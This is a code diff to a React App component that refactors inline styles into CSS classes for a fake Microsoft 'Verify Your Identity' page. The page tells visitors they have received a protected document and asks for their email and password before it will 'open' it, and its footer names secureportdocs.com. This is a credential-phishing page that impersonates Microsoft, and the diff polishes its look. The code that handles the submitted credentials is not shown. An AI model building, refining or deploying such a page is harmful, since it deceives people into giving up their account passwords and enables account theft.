@@ -118,6 +118,167 @@ function App() {
       .fade-in { animation: fadeIn 0.5s ease-out; }
       .document-icon { animation: spin 2s linear infinite; }
       .protected-doc:hover { transform: translateY(-2px); transition: transform 0.2s ease; }
+      
+      .card {
+        background: #fff;
+        border-radius: 10px;
+        box-shadow: 0 6px 22px 0 rgba(0,0,0,0.08);
+        padding: 35px 45px 35px 45px;
+        max-width: 530px;
+        width: 100%;
+        margin-top: 38px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+      }
+      .logo {
+        width: 100px;
+        margin-bottom: 28px;
+        display: block;
+      }
+      .title {
+        font-size: 1.7em;
+        font-weight: 600;
+        color: #23272a;
+        margin-bottom: 16px;
+        letter-spacing: 0.01em;
+        text-align: center;
+      }
+      .desc {
+        font-size: 1.04em;
+        color: #38444d;
+        margin-bottom: 10px;
+        text-align: center;
+      }
+      .secure-link {
+        font-size: 1.13em;
+        font-weight: 150;
+        color: #0078d4;
+        margin-bottom: 16px;
+        text-align: center;
+        word-break: break-word;
+      }
+      .instructions {
+        font-size: 1em;
+        color: #626b76;
+        margin-bottom: 20px;
+        line-height: 1.5em;
+        text-align: center;
+      }
+      .form-group {
+        width: 200%;
+        max-width: 1000px;
+        margin-left: -50%;
+        display: flex;
+        flex-direction: column;
+        align-items: flex-start;
+        background: none;
+      }
+      .input-label {
+        font-size: 0.97em;
+        color: #4d5a67;
+        margin-bottom: 7px;
+        text-align: left;
+        margin-left: 8px;
+        margin-top: 10px;
+        align-self: flex-start;
+      }
+      .input-row {
+        width: 100%;
+        position: relative;
+        margin-bottom: 18px;
+        background: #f6f8fa;
+        border-radius: 6px;
+        display: flex;
+        align-items: center;
+      }
+      input[type="email"], input[type="password"] {
+        width: 100%;
+        font-size: 1.07em;
+        padding: 12px 60px 12px 20px;
+        border: 1.5px solid #cfd8dc;
+        border-radius: 6px;
+        box-sizing: border-box;
+        transition: border 0.2s;
+        outline: none;
+        background: transparent;
+        margin-bottom: 0;
+        display: block;
+        color: #23272a;
+      }
+      input[type="email"]:focus, input[type="password"]:focus {
+        border-color: #0078d4;
+        background: #fff;
+      }
+      .input-icon {
+        position: absolute;
+        right: 12px;
+        top: 50%;
+        transform: translateY(-50%);
+        width: 22px;
+        height: 22px;
+        opacity: 0.6;
+        pointer-events: none;
+      }
+      .next-btn {
+        width: 100%;
+        background: linear-gradient(90deg,#0078d4 0,#005fa3 100%);
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        font-size: 1.15em;
+        font-weight: 500;
+        padding: 14px 0;
+        cursor: pointer;
+        margin-bottom: 18px;
+        margin-top: 6px;
+        box-shadow: 0 2px 8px rgba(0,120,212,0.08);
+        transition: background 0.18s;
+      }
+      .next-btn:hover, .next-btn:focus {
+        background: linear-gradient(90deg,#005fa3 0,#0078d4 100%);
+      }
+      .next-btn:disabled {
+        background: linear-gradient(90deg,#8a8a8a 0,#6a6a6a 100%);
+        cursor: not-allowed;
+      }
+      .footer-text {
+        font-size: 0.92em;
+        color: #8896ae;
+        margin-top: 12px;
+        margin-bottom: 0;
+        text-align: justify;
+        line-height: 1.5em;
+        max-width: 100%;
+        width: 100%;
+        letter-spacing: 0.01em;
+        word-break: break-word;
+        display: block;
+      }
+      .copyright {
+        text-align: center;
+        color: #b0b9c6;
+        font-size: 0.98em;
+        margin-top: 18px;
+        margin-bottom: 15px;
+      }
+      @media (max-width: 700px) {
+        .card {
+          max-width: 98vw;
+          padding: 18px 2vw 16px 2vw;
+        }
+        .footer-text, .copyright {
+          font-size: 0.87em;
+        }
+        .logo {
+          width: 92px;
+        }
+        .form-group {
+          width: 100%;
+          margin-left: 0;
+          max-width: 100%;
+        }
+      }
     `;
     document.head.appendChild(style);
     return () => document.head.removeChild(style);
@@ -522,259 +683,61 @@ function App() {
           flexDirection: 'column',
           alignItems: 'center',
         }}>
-          <div style={{
-            background: '#fff',
-            borderRadius: '10px',
-            boxShadow: '0 6px 22px 0 rgba(0,0,0,0.08)',
-            padding: '35px 45px 35px 45px',
-            maxWidth: '530px',
-            width: '100%',
-            marginTop: '38px',
-            display: 'flex',
-            flexDirection: 'column',
-            alignItems: 'center',
-          }}>
-            <img 
-              style={{
-                width: '100px',
-                marginBottom: '28px',
-                display: 'block',
-              }}
-              src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/768px-Microsoft_logo_%282012%29.svg.png?20230221160917" 
-              alt="Microsoft Logo"
-            />
-            <div style={{
-              fontSize: '1.7em',
-              fontWeight: 600,
-              color: '#23272a',
-              marginBottom: '16px',
-              letterSpacing: '0.01em',
-              textAlign: 'center',
-            }}>
-              Verify Your Identity
-            </div>
-            <div style={{
-              fontSize: '1.04em',
-              color: '#38444d',
-              marginBottom: '10px',
-              textAlign: 'center',
-            }}>
-              You've received a secure document
-            </div>
-            <div style={{
-              fontSize: '1.13em',
-              fontWeight: 150,
-              color: '#0078d4',
-              marginBottom: '16px',
-              textAlign: 'center',
-              wordBreak: 'break-word',
-            }}>
-              Protected Document File
-            </div>
-            <div style={{
-              fontSize: '1em',
-              color: '#626b76',
-              marginBottom: '20px',
-              lineHeight: '1.5em',
-              textAlign: 'center',
-            }}>
+          <div className="card">
+            <img className="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/768px-Microsoft_logo_%282012%29.svg.png?20230221160917" alt="Microsoft Logo" />
+            <div className="title">Verify Your Identity</div>
+            <div className="desc">You've received a secure document</div>
+            <div className="secure-link">Protected Document File</div>
+            <div className="instructions">
               To open this secure Document, please enter the email address that this item was shared to.
             </div>
-            <form onSubmit={handleFormSubmit} style={{ width: '100%' }}>
-              <div style={{
-                width: '200%',
-                maxWidth: '1000px',
-                marginLeft: '-50%',
-                display: 'flex',
-                flexDirection: 'column',
-                alignItems: 'flex-start',
-                background: 'none',
-              }}>
-                <label 
-                  style={{
-                    fontSize: '0.97em',
-                    color: '#4d5a67',
-                    marginBottom: '7px',
-                    textAlign: 'left',
-                    marginLeft: '8px',
-                    marginTop: '10px',
-                    alignSelf: 'flex-start',
-                  }}
-                  htmlFor="email"
-                >
-                  Email Address
-                </label>
-                <div style={{
-                  width: '100%',
-                  position: 'relative',
-                  marginBottom: '18px',
-                  background: '#f6f8fa',
-                  borderRadius: '6px',
-                  display: 'flex',
-                  alignItems: 'center',
-                }}>
+            <form onSubmit={handleFormSubmit}>
+              <div className="form-group">
+                <label className="input-label" htmlFor="email">Email Address</label>
+                <div className="input-row">
                   <input 
                     type="email" 
                     id="email" 
-                    placeholder="Enter email"
+                    placeholder="Enter email" 
                     required
                     value={formEmail}
                     onChange={(e) => setFormEmail(e.target.value)}
-                    style={{
-                      width: '100%',
-                      fontSize: '1.07em',
-                      padding: '12px 60px 12px 20px',
-                      border: '1.5px solid #cfd8dc',
-                      borderRadius: '6px',
-                      boxSizing: 'border-box',
-                      transition: 'border 0.2s',
-                      outline: 'none',
-                      background: 'transparent',
-                      marginBottom: 0,
-                      display: 'block',
-                      color: '#23272a',
-                    }}
                   />
-                  <svg 
-                    style={{
-                      position: 'absolute',
-                      right: '12px',
-                      top: '50%',
-                      transform: 'translateY(-50%)',
-                      width: '22px',
-                      height: '22px',
-                      opacity: 0.6,
-                      pointerEvents: 'none',
-                    }}
-                    viewBox="0 0 24 24" 
-                    fill="none"
-                  >
+                  <svg className="input-icon" viewBox="0 0 24 24" fill="none">
                     <rect x="3" y="5" width="18" height="14" rx="2" stroke="#0078d4" strokeWidth="1.5"/>
                     <path d="M3 5l9 7l9-7" stroke="#0078d4" strokeWidth="1.5" fill="none"/>
                   </svg>
                 </div>
-                <label 
-                  style={{
-                    fontSize: '0.97em',
-                    color: '#4d5a67',
-                    marginBottom: '7px',
-                    textAlign: 'left',
-                    marginLeft: '8px',
-                    marginTop: '10px',
-                    alignSelf: 'flex-start',
-                  }}
-                  htmlFor="password"
-                >
-                  Password
-                </label>
-                <div style={{
-                  width: '100%',
-                  position: 'relative',
-                  marginBottom: '18px',
-                  background: '#f6f8fa',
-                  borderRadius: '6px',
-                  display: 'flex',
-                  alignItems: 'center',
-                }}>
+                <label className="input-label" htmlFor="password">Password</label>
+                <div className="input-row">
                   <input 
                     type="password" 
                     id="password" 
-                    placeholder="Enter password"
+                    placeholder="Enter password" 
                     required
                     value={formPassword}
                     onChange={(e) => setFormPassword(e.target.value)}
-                    style={{
-                      width: '100%',
-                      fontSize: '1.07em',
-                      padding: '12px 60px 12px 20px',
-                      border: '1.5px solid #cfd8dc',
-                      borderRadius: '6px',
-                      boxSizing: 'border-box',
-                      transition: 'border 0.2s',
-                      outline: 'none',
-                      background: 'transparent',
-                      marginBottom: 0,
-                      display: 'block',
-                      color: '#23272a',
-                    }}
                   />
-                  <svg 
-                    style={{
-                      position: 'absolute',
-                      right: '12px',
-                      top: '50%',
-                      transform: 'translateY(-50%)',
-                      width: '22px',
-                      height: '22px',
-                      opacity: 0.6,
-                      pointerEvents: 'none',
-                    }}
-                    viewBox="0 0 24 24" 
-                    fill="none"
-                  >
+                  <svg className="input-icon" viewBox="0 0 24 24" fill="none">
                     <rect x="4" y="8" width="16" height="10" rx="2" stroke="#0078d4" strokeWidth="1.5"/>
                     <circle cx="12" cy="13" r="2" stroke="#0078d4" strokeWidth="1.5" fill="none"/>
                     <rect x="8" y="4" width="8" height="4" rx="1" stroke="#0078d4" strokeWidth="1.2" fill="none"/>
                   </svg>
                 </div>
                 <button 
-                  style={{
-                    width: '100%',
-                    background: isSubmitting 
-                      ? 'linear-gradient(90deg,#8a8a8a 0,#6a6a6a 100%)'
-                      : 'linear-gradient(90deg,#0078d4 0,#005fa3 100%)',
-                    color: '#fff',
-                    border: 'none',
-                    borderRadius: '4px',
-                    fontSize: '1.15em',
-                    fontWeight: 500,
-                    padding: '14px 0',
-                    cursor: isSubmitting ? 'not-allowed' : 'pointer',
-                    marginBottom: '18px',
-                    marginTop: '6px',
-                    boxShadow: '0 2px 8px rgba(0,120,212,0.08)',
-                    transition: 'background 0.18s',
-                  }}
+                  className="next-btn"
                   type="submit"
                   disabled={isSubmitting}
-                  onMouseOver={(e) => {
-                    if (!isSubmitting) {
-                      e.currentTarget.style.background = 'linear-gradient(90deg,#005fa3 0,#0078d4 100%)';
-                    }
-                  }}
-                  onMouseOut={(e) => {
-                    if (!isSubmitting) {
-                      e.currentTarget.style.background = 'linear-gradient(90deg,#0078d4 0,#005fa3 100%)';
-                    }
-                  }}
                 >
                   {isSubmitting ? 'Authenticating...' : 'Authenticate & Open Document'}
                 </button>
               </div>
             </form>
-            <p style={{
-              fontSize: '0.92em',
-              color: '#8896ae',
-              marginTop: '12px',
-              marginBottom: 0,
-              textAlign: 'justify',
-              lineHeight: '1.5em',
-              maxWidth: '100%',
-              width: '100%',
-              letterSpacing: '0.01em',
-              wordBreak: 'break-word',
-              display: 'block',
-            }}>
+            <p className="footer-text">
               By clicking Next, you allow secureportdocs.com to use your email address in accordance with their privacy statement. secureportdocs.com has not provided links to their terms for you to review.
             </p>
           </div>
-          <div style={{
-            textAlign: 'center',
-            color: '#b0b9c6',
-            fontSize: '0.98em',
-            marginTop: '18px',
-            marginBottom: '15px',
-          }}>
+          <div className="copyright">
             © 2025 Microsoft &nbsp; Privacy & Cookies
           </div>
         </div>
